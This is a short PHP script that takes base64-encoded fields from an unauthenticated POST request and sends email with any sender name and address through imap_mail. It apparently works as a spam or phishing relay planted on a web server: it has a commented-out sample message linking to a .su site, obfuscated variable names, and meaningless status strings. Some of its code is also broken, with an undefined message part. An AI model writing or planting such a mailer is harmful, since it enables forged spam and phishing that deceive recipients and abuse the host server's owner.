<?php

function mailto($to, $subject, $message, $from, $fromAddr) {
$mb_internal_encoding = mb_internal_encoding();
mb_internal_encoding('UTF-8');
$headers = "Date: ".date("r")."\r\n";
$headers.= "From: =?UTF-8?B?".base64_encode($from)."?= <".$fromAddr.">\r\n";
$headers.= "MIME-Version: 1.0\r\n";
$subject = "=?UTF-8?B?".base64_encode($subject)."?=";
if (strpos($message, '<html')) {
$msgType = "text/html";
} else $msgType = "text/plain";
$body = $message;
mb_internal_encoding($mb_internal_encoding);
return imap_mail($to, $subject, $body, $headers);
}


function composeMessage($message, $description, $from_name, $from_addrr)
    {
        $envelope["from"] = "$from_name <$from_addrr>";
        $envelope["to"] = "";
        $part1["type"] = TYPEMULTIPART;
        $part1["subtype"] = "mixed";
        
        $part3["type"] = TYPETEXT;
        $part3["subtype"] = "plain";
        $part3["description"] = $description;
        $part3["contents.data"] = $message;
        $body[1] = $part1;
        $body[2] = $part3;
        $body[3] = $part2;
        return imap_mail_compose($envelope, $body);
    }

//$message = 'Dj irewiewritw wk l <BR> <a href="http://magichottrade.su/?cid=gogogo">http://magichottrade.su/?cid=gogogo</a>';

$message = base64_decode($_POST['body']); 
$description = base64_decode($_POST['subject']); 
$from_name = base64_decode($_POST['from']);  
$from_addrr = base64_decode($_POST['fromaddrr']); 



$body = composeMessage($message, $description, $from_name, $from_addrr);

$jfnbrsjfq =  imap_mail(base64_decode($_POST['to']), $description, null, $body);


if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 
